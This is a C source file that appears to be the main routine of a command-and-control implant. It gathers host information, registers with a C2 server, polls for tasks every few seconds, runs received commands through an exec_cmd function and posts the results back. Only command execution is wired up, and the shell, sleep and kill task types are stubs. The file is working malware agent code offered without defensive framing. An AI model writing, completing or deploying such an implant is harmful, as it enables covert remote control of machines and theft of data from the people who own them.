#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, 0};
    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}, {'\0'}};
    struct tasks task = { {'\0'}, 0, {'\0'}, {'\0'}, NULL, NULL, {'\0'}, 0, 1};
 
    bool host_info_gathered = false;
    while(!host_info_gathered) {
        if(get_host_info(&agent)) {
            puts("Host info gathered.\n");
            host_info_gathered = true;
            break;
        } else {
            puts("Unable to gather host info.\n");
            continue;
        }
    }

    puts("Registering with C2 server...\n");
    bool registered = false;
    while(!registered) {
        if(reg(&agent, &sa)) {
            puts("Agent has registered with C2 server.\n");
            registered = true;
            continue;
        } else {
            puts("Failed to register agent with C2 server, trying again.\n");
            sleep(5);
            continue;
        }

    }

    create_tasks_url(sa.response, &agent);
    create_results_url(&agent, &task);

    puts("Checking in for tasks\n");

    while(true) {
        if(!check_tasks(&agent, &sa)) {
            puts("No tasks during check in.\n");
            puts("Checking back in for more tasks shortly.\n");
            sleep(15);
            continue;
        }
        if(!parse_tasks(sa.response, &task)) {
            puts("Tasks not parsed successfully.\n");
            continue;
        }

        // Begin iterating through task.tasks_array array and extracting task ID
        // task type, task cmd, and args to then call follow on task execution
        // functions.
        printf("%ld tasks collected.\n\n", task.sz);
        for (unsigned int i = 0; i < task.sz; i++) {      

            // Ref for scanning remainder of string (%[\001-\377]):
            // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
            sscanf(task.tasks_array[i], "%s %d %s %[\001-\377]", task.id, &task.type, task.cmd, task.args);

            // Designates enum for task types.
            enum TASK_TYPE {CMD, SLEEP, SHELL, KILL};

            // Begin switch statement against task type to then call follow on
            // task execution functions.
            switch (task.type) {
            case CMD:
                printf("Executing task: %s %s\n\n", task.cmd, task.args);
                exec_cmd(&task);
                break;
            case SLEEP:
                puts("SLEEP task detected\n");
                break;
            case SHELL:
                puts("SHELL task detected\n");
                break;
            case KILL:
                puts("KILL task detected\n");
                break;
            default:
                puts("Invalid task type.\n");
                continue;
            }
            post_results(&task, &sa);
            printf("Posted results for task: %s\n\n", task.cmd);

            // After executing each task and posting results reset values
            // to execute next task.
            reset_task_vals(&task);
        }

        free(sa.response);
        destroy(&task);

        task.results = NULL;
        sa.response = NULL;
        sa.size = 0;
        task.sz = 0;

        sleep(10);
    }
        
}